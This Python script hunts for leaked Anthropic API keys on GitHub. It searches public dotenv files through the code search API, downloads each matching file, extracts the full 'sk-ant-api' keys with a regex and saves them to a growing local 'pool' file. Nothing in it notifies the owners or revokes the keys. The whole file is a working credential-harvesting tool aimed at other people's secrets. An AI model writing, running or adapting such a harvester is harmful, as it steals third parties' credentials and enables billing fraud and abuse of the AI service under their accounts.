import os
import re
import time
import requests
from pathlib import Path
import json

# GitHub Search API rate limits:
# 30 requests per minute with authentication

KEYS_FILE = Path("data/anthropic_keys.txt")

def search_github_for_claude_keys():
    print("[*] Starting GitHub API Hunter for Anthropic Keys...")
    
    # Reload from .env explicitly
    env_token = ""
    if Path(".env").exists():
        for line in Path(".env").read_text().splitlines():
            if line.startswith("GITHUB_TOKEN="):
                env_token = line.split("=", 1)[1].strip().strip('"\'')
    
    GITHUB_TOKEN = os.getenv("GITHUB_TOKEN", env_token)
    if not GITHUB_TOKEN:
        print("[!] GITHUB_TOKEN environment variable is not set. Rate limits will be extremely restricted.")
    
    headers = {
        "Accept": "application/vnd.github.v3+json",
    }
    if GITHUB_TOKEN:
        headers["Authorization"] = f"token {GITHUB_TOKEN}"

    # Search query: ANTHROPIC_API_KEY=sk-ant- language:Dotenv
    query = "ANTHROPIC_API_KEY=sk-ant- language:Dotenv"
    url = f"https://api.github.com/search/code?q={requests.utils.quote(query)}&per_page=100"

    print(f"[*] Searching GitHub: {query}")
    try:
        r = requests.get(url, headers=headers, timeout=10)
        if r.status_code != 200:
            print(f"[-] GitHub API error: {r.status_code} - {r.text}")
            return []

        data = r.json()
        items = data.get("items", [])
        print(f"[*] Found {len(items)} potentially matching files.")

        found_keys = set()
        
        # Load existing keys
        if KEYS_FILE.exists():
            existing_keys = set(KEYS_FILE.read_text().splitlines())
            found_keys.update(existing_keys)

        new_keys_count = 0
        
        for item in items:
            raw_url = item.get("html_url", "").replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
            if not raw_url:
                continue
                
            try:
                # Fetch raw file content
                file_resp = requests.get(raw_url, headers={"Authorization": f"token {GITHUB_TOKEN}"} if GITHUB_TOKEN else {}, timeout=5)
                if file_resp.status_code == 200:
                    content = file_resp.text
                    # Extract sk-ant-api03-xxxx
                    matches = re.findall(r"sk-ant-api[a-zA-Z0-9\-_]{20,}", content)
                    for match in matches:
                        if match not in found_keys:
                            found_keys.add(match)
                            new_keys_count += 1
                            print(f"[+] Found new Anthropic Key: {match[:15]}... (saved)")
            except Exception as e:
                pass
            
            # Prevent hitting secondary rate limits
            time.sleep(1)
            
        KEYS_FILE.parent.mkdir(parents=True, exist_ok=True)
        KEYS_FILE.write_text("\n".join(found_keys))
        print(f"[*] Search complete. Added {new_keys_count} new keys. Total pool: {len(found_keys)}")
        
        return list(found_keys)

    except Exception as e:
        print(f"[-] Error hunting GitHub: {e}")
        return []

if __name__ == "__main__":
    search_github_for_claude_keys()
